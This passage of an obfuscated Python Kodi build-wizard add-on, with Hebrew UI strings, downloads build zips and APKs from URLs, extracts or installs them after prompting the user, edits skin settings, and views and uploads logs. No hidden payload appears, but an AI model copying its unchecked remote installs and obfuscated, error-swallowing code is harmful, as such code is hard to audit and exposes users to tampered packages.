			OOOO000OOOO00OO00 =re .compile (O00O0O0OO0OO0O00O ).findall (O00OO0O0OOO0OO0O0 )[0 ]#line:4300
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'w')#line:4301
			O0O0O00O0OOOOO000 .write (O00OO0O0OOO0OO0O0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOOO000OOOO00OO00 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4302
			O0O0O00O0OOOOO000 .close ()#line:4303
			O0O0OOOO0OO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4307
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'r')#line:4309
			O00OO0O0OOO0OO0O0 =O0O0O00O0OOOOO000 .read ()#line:4310
			O0O0O00O0OOOOO000 .close ()#line:4311
			O00O0O0OO0OO0O00O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4312
			OOOO000OOOO00OO00 =re .compile (O00O0O0OO0OO0O00O ).findall (O00OO0O0OOO0OO0O0 )[0 ]#line:4313
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'w')#line:4314
			O0O0O00O0OOOOO000 .write (O00OO0O0OOO0OO0O0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOOO000OOOO00OO00 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4315
			O0O0O00O0OOOOO000 .close ()#line:4316
			O0O0OOOO0OO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4320
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'r')#line:4322
			O00OO0O0OOO0OO0O0 =O0O0O00O0OOOOO000 .read ()#line:4323
			O0O0O00O0OOOOO000 .close ()#line:4324
			O00O0O0OO0OO0O00O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4325
			OOOO000OOOO00OO00 =re .compile (O00O0O0OO0OO0O00O ).findall (O00OO0O0OOO0OO0O0 )[0 ]#line:4326
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'w')#line:4327
			O0O0O00O0OOOOO000 .write (O00OO0O0OOO0OO0O0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOOO000OOOO00OO00 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4328
			O0O0O00O0OOOOO000 .close ()#line:4329
		except :#line:4334
			pass #line:4335
def thirdPartyInstall (OO0O0O0000OO0OOO0 ,OO0O0000OO00O00OO ):#line:4337
	if not wiz .workingURL (OO0O0000OO00O00OO ):#line:4338
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4339
	OOO0OO00O000O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0O0000OO0OOO0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4340
	if OOO0OO00O000O0O0O ==1 :#line:4341
		freshStart ('third',True )#line:4342
	wiz .clearS ('build')#line:4343
	O0OO0OO0O0O00OO0O =OO0O0O0000OO0OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4344
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4345
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O0000OO0OOO0 ),'','אנא המתן')#line:4346
	O0O0OO00O00OOO0OO =os .path .join (PACKAGES ,'%s.zip'%O0OO0OO0O0O00OO0O )#line:4347
	try :os .remove (O0O0OO00O00OOO0OO )#line:4348
	except :pass #line:4349
	downloader .download (OO0O0000OO00O00OO ,O0O0OO00O00OOO0OO ,DP )#line:4350
	xbmc .sleep (1000 )#line:4351
	OOO00O00OO000OOOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O0000OO0OOO0 )#line:4352
	DP .update (0 ,OOO00O00OO000OOOO ,'','אנא המתן')#line:4353
	OO0OOOOO0O0OOOO0O ,OOOOO0OOOOO00O0OO ,O00000OO0OOO0000O =extract .all (O0O0OO00O00OOO0OO ,HOME ,DP ,title =OOO00O00OO000OOOO )#line:4354
	if int (float (OO0OOOOO0O0OOOO0O ))>0 :#line:4355
		wiz .fixmetas ()#line:4356
		wiz .lookandFeelData ('save')#line:4357
		wiz .defaultSkin ()#line:4358
		wiz .setS ('installed','true')#line:4360
		wiz .setS ('extract',str (OO0OOOOO0O0OOOO0O ))#line:4361
		wiz .setS ('errors',str (OOOOO0OOOOO00O0OO ))#line:4362
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO0OOOOO0O0OOOO0O ,OOOOO0OOOOO00O0OO ))#line:4363
		try :os .remove (O0O0OO00O00OOO0OO )#line:4364
		except :pass #line:4365
		if int (float (OOOOO0OOOOO00O0OO ))>0 :#line:4366
			OOOO0O0O0O0O0O0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O0000OO0OOO0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO0OOOOO0O0OOOO0O ,'%',COLOR1 ,OOOOO0OOOOO00O0OO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4367
			if OOOO0O0O0O0O0O0OO :#line:4368
				if isinstance (OOOOO0OOOOO00O0OO ,unicode ):#line:4369
					O00000OO0OOO0000O =O00000OO0OOO0000O .encode ('utf-8')#line:4370
				wiz .TextBox (ADDONTITLE ,O00000OO0OOO0000O )#line:4371
	DP .close ()#line:4372
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4373
	if INSTALLMETHOD ==1 :OOO000O000OOO0O00 =1 #line:4374
	elif INSTALLMETHOD ==2 :OOO000O000OOO0O00 =0 #line:4375
	else :OOO000O000OOO0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4376
	if OOO000O000OOO0O00 ==1 :wiz .reloadFix ()#line:4377
	else :wiz .killxbmc (True )#line:4378
def testTheme (OO00O0O0O00OO00OO ):#line:4380
	OOOOO000000O00OO0 =zipfile .ZipFile (OO00O0O0O00OO00OO )#line:4381
	for O0000OO0O0OOOOO00 in OOOOO000000O00OO0 .infolist ():#line:4382
		if '/settings.xml'in O0000OO0O0OOOOO00 .filename :#line:4383
			return True #line:4384
	return False #line:4385
def testGui (OO0OO0OO00000O00O ):#line:4387
	O00O0O0O0OOOOOOOO =zipfile .ZipFile (OO0OO0OO00000O00O )#line:4388
	for O000OO00OO0OOO0OO in O00O0O0O0OOOOOOOO .infolist ():#line:4389
		if '/guisettings.xml'in O000OO00OO0OOO0OO .filename :#line:4390
			return True #line:4391
	return False #line:4392
def apkInstaller (O0O0O0000OOO0OO00 ,O0OOO000OOO0O0OO0 ):#line:4394
	wiz .log (O0O0O0000OOO0OO00 )#line:4395
	wiz .log (O0OOO000OOO0O0OO0 )#line:4396
	if wiz .platform ()=='android':#line:4397
		OO00OOO000OOOO000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O0000OOO0OO00 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4398
		if not OO00OOO000OOOO000 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4399
		OOO00O0O0OO0OOOO0 =O0O0O0000OOO0OO00 #line:4400
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4401
		if not wiz .workingURL (O0OOO000OOO0O0OO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4402
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O0O0OO0OOOO0 ),'','אנא המתן')#line:4403
		O0OOOOO000OOOOOO0 =os .path .join (PACKAGES ,"%s.apk"%O0O0O0000OOO0OO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4404
		try :os .remove (O0OOOOO000OOOOOO0 )#line:4405
		except :pass #line:4406
		downloader .download (O0OOO000OOO0O0OO0 ,O0OOOOO000OOOOOO0 ,DP )#line:4407
		xbmc .sleep (100 )#line:4408
		DP .close ()#line:4409
		notify .apkInstaller (O0O0O0000OOO0OO00 )#line:4410
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0OOOOO000OOOOOO0 +'")')#line:4411
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4412
def createMenu (OO00O00OO0OO00O00 ,OO0000O000OO0O0O0 ,O00O00OO00O000OO0 ):#line:4418
	if OO00O00OO0OO00O00 =='saveaddon':#line:4419
		O00OOO0O0OOO0OOO0 =[]#line:4420
		OO0000000O000O00O =urllib .quote_plus (OO0000O000OO0O0O0 .lower ().replace (' ',''))#line:4421
		OO00000O000000O00 =OO0000O000OO0O0O0 .replace ('Debrid','Real Debrid')#line:4422
		O0OO00O0OOOOO00OO =urllib .quote_plus (O00O00OO00O000OO0 .lower ().replace (' ',''))#line:4423
		O00O00OO00O000OO0 =O00O00OO00O000OO0 .replace ('url','URL Resolver')#line:4424
		O00OOO0O0OOO0OOO0 .append ((THEME2 %O00O00OO00O000OO0 .title (),' '))#line:4425
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Save %s Data'%OO00000O000000O00 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0000000O000O00O ,O0OO00O0OOOOO00OO )))#line:4426
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Restore %s Data'%OO00000O000000O00 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0000000O000O00O ,O0OO00O0OOOOO00OO )))#line:4427
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Clear %s Data'%OO00000O000000O00 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO0000000O000O00O ,O0OO00O0OOOOO00OO )))#line:4428
	elif OO00O00OO0OO00O00 =='save':#line:4429
		O00OOO0O0OOO0OOO0 =[]#line:4430
		OO0000000O000O00O =urllib .quote_plus (OO0000O000OO0O0O0 .lower ().replace (' ',''))#line:4431
		OO00000O000000O00 =OO0000O000OO0O0O0 .replace ('Debrid','Real Debrid')#line:4432
		O0OO00O0OOOOO00OO =urllib .quote_plus (O00O00OO00O000OO0 .lower ().replace (' ',''))#line:4433
		O00O00OO00O000OO0 =O00O00OO00O000OO0 .replace ('url','URL Resolver')#line:4434
		O00OOO0O0OOO0OOO0 .append ((THEME2 %O00O00OO00O000OO0 .title (),' '))#line:4435
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Register %s'%OO00000O000000O00 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO0000000O000O00O ,O0OO00O0OOOOO00OO )))#line:4436
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Save %s Data'%OO00000O000000O00 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0000000O000O00O ,O0OO00O0OOOOO00OO )))#line:4437
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Restore %s Data'%OO00000O000000O00 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0000000O000O00O ,O0OO00O0OOOOO00OO )))#line:4438
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Import %s Data'%OO00000O000000O00 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO0000000O000O00O ,O0OO00O0OOOOO00OO )))#line:4439
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Clear Addon %s Data'%OO00000O000000O00 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO0000000O000O00O ,O0OO00O0OOOOO00OO )))#line:4440
	elif OO00O00OO0OO00O00 =='install':#line:4441
		O00OOO0O0OOO0OOO0 =[]#line:4442
		O0OO00O0OOOOO00OO =urllib .quote_plus (O00O00OO00O000OO0 )#line:4443
		O00OOO0O0OOO0OOO0 .append ((THEME2 %O00O00OO00O000OO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0OO00O0OOOOO00OO )))#line:4444
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0OO00O0OOOOO00OO )))#line:4445
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0OO00O0OOOOO00OO )))#line:4446
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0OO00O0OOOOO00OO )))#line:4447
		O00OOO0O0OOO0OOO0 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0OO00O0OOOOO00OO )))#line:4448
	O00OOO0O0OOO0OOO0 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4449
	return O00OOO0O0OOO0OOO0 #line:4450
def toggleCache (OOO0OOOO00OOOO0O0 ):#line:4452
	OOO00O0O00OO00O0O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4453
	OO00OOO0OOO0O00OO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4454
	if OOO0OOOO00OOOO0O0 in ['true','false']:#line:4455
		for OOOOO00OOO0O00OOO in OOO00O0O00OO00O0O :#line:4456
			wiz .setS (OOOOO00OOO0O00OOO ,OOO0OOOO00OOOO0O0 )#line:4457
	else :#line:4458
		if not OOO0OOOO00OOOO0O0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4459
			try :#line:4460
				OOOOO00OOO0O00OOO =OO00OOO0OOO0O00OO [OOO00O0O00OO00O0O .index (OOO0OOOO00OOOO0O0 )]#line:4461
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOOOO00OOO0O00OOO ))#line:4462
			except :#line:4463
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOO0OOOO00OOOO0O0 ))#line:4464
		else :#line:4465
			OO0000OOO0OOO0O00 ='true'if wiz .getS (OOO0OOOO00OOOO0O0 )=='false'else 'false'#line:4466
			wiz .setS (OOO0OOOO00OOOO0O0 ,OO0000OOO0OOO0O00 )#line:4467
def playVideo (O0000O000O00OO000 ):#line:4469
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0000O000O00OO000 )#line:4470
	if 'watch?v='in O0000O000O00OO000 :#line:4471
		OOO0OO0O00O000O00 ,OOOOO0O0O0OO00OO0 =O0000O000O00OO000 .split ('?')#line:4472
		OO0O00O00OOO00OO0 =OOOOO0O0O0OO00OO0 .split ('&')#line:4473
		for OO0O0000O00O0OO00 in OO0O00O00OOO00OO0 :#line:4474
			if OO0O0000O00O0OO00 .startswith ('v='):#line:4475
				O0000O000O00OO000 =OO0O0000O00O0OO00 [2 :]#line:4476
				break #line:4477
			else :continue #line:4478
	elif 'embed'in O0000O000O00OO000 or 'youtu.be'in O0000O000O00OO000 :#line:4479
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0000O000O00OO000 )#line:4480
		OOO0OO0O00O000O00 =O0000O000O00OO000 .split ('/')#line:4481
		if len (OOO0OO0O00O000O00 [-1 ])>5 :#line:4482
			O0000O000O00OO000 =OOO0OO0O00O000O00 [-1 ]#line:4483
		elif len (OOO0OO0O00O000O00 [-2 ])>5 :#line:4484
			O0000O000O00OO000 =OOO0OO0O00O000O00 [-2 ]#line:4485
	wiz .log ("YouTube URL: %s"%O0000O000O00OO000 )#line:4486
	yt .PlayVideo (O0000O000O00OO000 )#line:4487
def viewLogFile ():#line:4489
	O000O00OOOO00O000 =wiz .Grab_Log (True )#line:4490
	O000OOO0O0OOO0OO0 =wiz .Grab_Log (True ,True )#line:4491
	O0OO00OOO000OOO0O =0 ;OO00OO0O0O0O00000 =O000O00OOOO00O000 #line:4492
	if not O000OOO0O0OOO0OO0 ==False and not O000O00OOOO00O000 ==False :#line:4493
		O0OO00OOO000OOO0O =DIALOG .select (ADDONTITLE ,["View %s"%O000O00OOOO00O000 .replace (LOG ,""),"View %s"%O000OOO0O0OOO0OO0 .replace (LOG ,"")])#line:4494
		if O0OO00OOO000OOO0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4495
	elif O000O00OOOO00O000 ==False and O000OOO0O0OOO0OO0 ==False :#line:4496
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4497
		return #line:4498
	elif not O000O00OOOO00O000 ==False :O0OO00OOO000OOO0O =0 #line:4499
	elif not O000OOO0O0OOO0OO0 ==False :O0OO00OOO000OOO0O =1 #line:4500
	OO00OO0O0O0O00000 =O000O00OOOO00O000 if O0OO00OOO000OOO0O ==0 else O000OOO0O0OOO0OO0 #line:4502
	OOO00O00OO0000000 =wiz .Grab_Log (False )if O0OO00OOO000OOO0O ==0 else wiz .Grab_Log (False ,True )#line:4503
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO00OO0O0O0O00000 ),OOO00O00OO0000000 )#line:4505
def errorChecking (log =None ,count =None ,all =None ):#line:4507
	if log ==None :#line:4508
		O000000O00OOO0O00 =wiz .Grab_Log (True )#line:4509
		OOOO00OOO0O0O0O0O =wiz .Grab_Log (True ,True )#line:4510
		if not OOOO00OOO0O0O0O0O ==False and not O000000O00OOO0O00 ==False :#line:4511
			O000O000000O00OOO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O000000O00OOO0O00 .replace (LOG ,""),errorChecking (O000000O00OOO0O00 ,True ,True )),"View %s: %s error(s)"%(OOOO00OOO0O0O0O0O .replace (LOG ,""),errorChecking (OOOO00OOO0O0O0O0O ,True ,True ))])#line:4512
			if O000O000000O00OOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4513
		elif O000000O00OOO0O00 ==False and OOOO00OOO0O0O0O0O ==False :#line:4514
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4515
			return #line:4516
		elif not O000000O00OOO0O00 ==False :O000O000000O00OOO =0 #line:4517
		elif not OOOO00OOO0O0O0O0O ==False :O000O000000O00OOO =1 #line:4518
		log =O000000O00OOO0O00 if O000O000000O00OOO ==0 else OOOO00OOO0O0O0O0O #line:4519
	if log ==False :#line:4520
		if count ==None :#line:4521
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4522
			return False #line:4523
		else :#line:4524
			return 0 #line:4525
	else :#line:4526
		if os .path .exists (log ):#line:4527
			O00OOOO0000000OO0 =open (log ,mode ='r');O0O0OO0OO000OO000 =O00OOOO0000000OO0 .read ().replace ('\n','').replace ('\r','');O00OOOO0000000OO0 .close ()#line:4528
			OOO00OO0O0O0O00O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0O0OO0OO000OO000 )#line:4529
			if not count ==None :#line:4530
				if all ==None :#line:4531
					O000O000O0O0O00O0 =0 #line:4532
					for O0O0O0O0O00O000O0 in OOO00OO0O0O0O00O0 :#line:4533
						if ADDON_ID in O0O0O0O0O00O000O0 :O000O000O0O0O00O0 +=1 #line:4534
					return O000O000O0O0O00O0 #line:4535
				else :return len (OOO00OO0O0O0O00O0 )#line:4536
			if len (OOO00OO0O0O0O00O0 )>0 :#line:4537
				O000O000O0O0O00O0 =0 ;OOOOOOO0OO00O0O0O =""#line:4538
				for O0O0O0O0O00O000O0 in OOO00OO0O0O0O00O0 :#line:4539
					if all ==None and not ADDON_ID in O0O0O0O0O00O000O0 :continue #line:4540
					else :#line:4541
						O000O000O0O0O00O0 +=1 #line:4542
						OOOOOOO0OO00O0O0O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O000O000O0O0O00O0 ,O0O0O0O0O00O000O0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4543
				if O000O000O0O0O00O0 >0 :#line:4544
					wiz .TextBox (ADDONTITLE ,OOOOOOO0OO00O0O0O )#line:4545
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4546
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4547
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4548
ACTION_PREVIOUS_MENU =10 #line:4550
ACTION_NAV_BACK =92 #line:4551
ACTION_MOVE_LEFT =1 #line:4552
ACTION_MOVE_RIGHT =2 #line:4553
ACTION_MOVE_UP =3 #line:4554
ACTION_MOVE_DOWN =4 #line:4555
ACTION_MOUSE_WHEEL_UP =104 #line:4556
ACTION_MOUSE_WHEEL_DOWN =105 #line:4557
ACTION_MOVE_MOUSE =107 #line:4558
ACTION_SELECT_ITEM =7 #line:4559
ACTION_BACKSPACE =110 #line:4560
ACTION_MOUSE_LEFT_CLICK =100 #line:4561
ACTION_MOUSE_LONG_CLICK =108 #line:4562
def LogViewer (default =None ):#line:4564
	class O0O0O00000OO0O00O (xbmcgui .WindowXMLDialog ):#line:4565
		def __init__ (OO0O0O0OOO000OO00 ,*OOOO00OO00O000O0O ,**OO0O0O000OO000OOO ):#line:4566
			OO0O0O0OOO000OO00 .default =OO0O0O000OO000OOO ['default']#line:4567
		def onInit (OO0O00OO00OO000OO ):#line:4569
			OO0O00OO00OO000OO .title =101 #line:4570
			OO0O00OO00OO000OO .msg =102 #line:4571
			OO0O00OO00OO000OO .scrollbar =103 #line:4572
			OO0O00OO00OO000OO .upload =201 #line:4573
			OO0O00OO00OO000OO .kodi =202 #line:4574
			OO0O00OO00OO000OO .kodiold =203 #line:4575
			OO0O00OO00OO000OO .wizard =204 #line:4576
			OO0O00OO00OO000OO .okbutton =205 #line:4577
			O000O0O0O00OOOO00 =open (OO0O00OO00OO000OO .default ,'r')#line:4578
			OO0O00OO00OO000OO .logmsg =O000O0O0O00OOOO00 .read ()#line:4579
			O000O0O0O00OOOO00 .close ()#line:4580
			OO0O00OO00OO000OO .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O00OO00OO000OO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4581
			OO0O00OO00OO000OO .showdialog ()#line:4582
		def showdialog (OO00000O0OO000O00 ):#line:4584
			OO00000O0OO000O00 .getControl (OO00000O0OO000O00 .title ).setLabel (OO00000O0OO000O00 .titlemsg )#line:4585
			OO00000O0OO000O00 .getControl (OO00000O0OO000O00 .msg ).setText (wiz .highlightText (OO00000O0OO000O00 .logmsg ))#line:4586
			OO00000O0OO000O00 .setFocusId (OO00000O0OO000O00 .scrollbar )#line:4587
		def onClick (O0O0O00O000OOO00O ,OOO0OO0OOO00OOO0O ):#line:4589
			if OOO0OO0OOO00OOO0O ==O0O0O00O000OOO00O .okbutton :O0O0O00O000OOO00O .close ()#line:4590
			elif OOO0OO0OOO00OOO0O ==O0O0O00O000OOO00O .upload :O0O0O00O000OOO00O .close ();uploadLog .Main ()#line:4591
			elif OOO0OO0OOO00OOO0O ==O0O0O00O000OOO00O .kodi :#line:4592
				OOOOO0OO0OO00OOO0 =wiz .Grab_Log (False )#line:4593
				O0OO00OO000OO00O0 =wiz .Grab_Log (True )#line:4594
				if OOOOO0OO0OO00OOO0 ==False :#line:4595
					O0O0O00O000OOO00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4596
					O0O0O00O000OOO00O .getControl (O0O0O00O000OOO00O .msg ).setText ("Log File Does Not Exists!")#line:4597
				else :#line:4598
					O0O0O00O000OOO00O .titlemsg ="%s: %s"%(ADDONTITLE ,O0OO00OO000OO00O0 .replace (LOG ,''))#line:4599
					O0O0O00O000OOO00O .getControl (O0O0O00O000OOO00O .title ).setLabel (O0O0O00O000OOO00O .titlemsg )#line:4600
					O0O0O00O000OOO00O .getControl (O0O0O00O000OOO00O .msg ).setText (wiz .highlightText (OOOOO0OO0OO00OOO0 ))#line:4601
					O0O0O00O000OOO00O .setFocusId (O0O0O00O000OOO00O .scrollbar )#line:4602
			elif OOO0OO0OOO00OOO0O ==O0O0O00O000OOO00O .kodiold :#line:4603
				OOOOO0OO0OO00OOO0 =wiz .Grab_Log (False ,True )#line:4604
				O0OO00OO000OO00O0 =wiz .Grab_Log (True ,True )#line:4605
				if OOOOO0OO0OO00OOO0 ==False :#line:4606
					O0O0O00O000OOO00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4607
					O0O0O00O000OOO00O .getControl (O0O0O00O000OOO00O .msg ).setText ("Log File Does Not Exists!")#line:4608
				else :#line:4609
					O0O0O00O000OOO00O .titlemsg ="%s: %s"%(ADDONTITLE ,O0OO00OO000OO00O0 .replace (LOG ,''))#line:4610
					O0O0O00O000OOO00O .getControl (O0O0O00O000OOO00O .title ).setLabel (O0O0O00O000OOO00O .titlemsg )#line:4611
					O0O0O00O000OOO00O .getControl (O0O0O00O000OOO00O .msg ).setText (wiz .highlightText (OOOOO0OO0OO00OOO0 ))#line:4612
					O0O0O00O000OOO00O .setFocusId (O0O0O00O000OOO00O .scrollbar )#line:4613
			elif OOO0OO0OOO00OOO0O ==O0O0O00O000OOO00O .wizard :#line:4614
				OOOOO0OO0OO00OOO0 =wiz .Grab_Log (False ,False ,True )#line:4615
				O0OO00OO000OO00O0 =wiz .Grab_Log (True ,False ,True )#line:4616
				if OOOOO0OO0OO00OOO0 ==False :#line:4617
					O0O0O00O000OOO00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4618
					O0O0O00O000OOO00O .getControl (O0O0O00O000OOO00O .msg ).setText ("Log File Does Not Exists!")#line:4619
				else :#line:4620
					O0O0O00O000OOO00O .titlemsg ="%s: %s"%(ADDONTITLE ,O0OO00OO000OO00O0 .replace (ADDONDATA ,''))#line:4621
					O0O0O00O000OOO00O .getControl (O0O0O00O000OOO00O .title ).setLabel (O0O0O00O000OOO00O .titlemsg )#line:4622
					O0O0O00O000OOO00O .getControl (O0O0O00O000OOO00O .msg ).setText (wiz .highlightText (OOOOO0OO0OO00OOO0 ))#line:4623
					O0O0O00O000OOO00O .setFocusId (O0O0O00O000OOO00O .scrollbar )#line:4624
		def onAction (O0OO000OOO0000OO0 ,OO00O0OOO0O00O0O0 ):#line:4626
			if OO00O0OOO0O00O0O0 ==ACTION_PREVIOUS_MENU :O0OO000OOO0000OO0 .close ()#line:4627
			elif OO00O0OOO0O00O0O0 ==ACTION_NAV_BACK :O0OO000OOO0000OO0 .close ()#line:4628
	if default ==None :default =wiz .Grab_Log (True )#line:4629
	OOOO00OO0O00OO0O0 =O0O0O00000OO0O00O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4630
	OOOO00OO0O00OO0O0 .doModal ()#line:4631
	del OOOO00OO0O00OO0O0 #line:4632
def removeAddon (O000000000O0000O0 ,O0000OOO00OO0O0OO ,over =False ):#line:4634
	if not over ==False :#line:4635
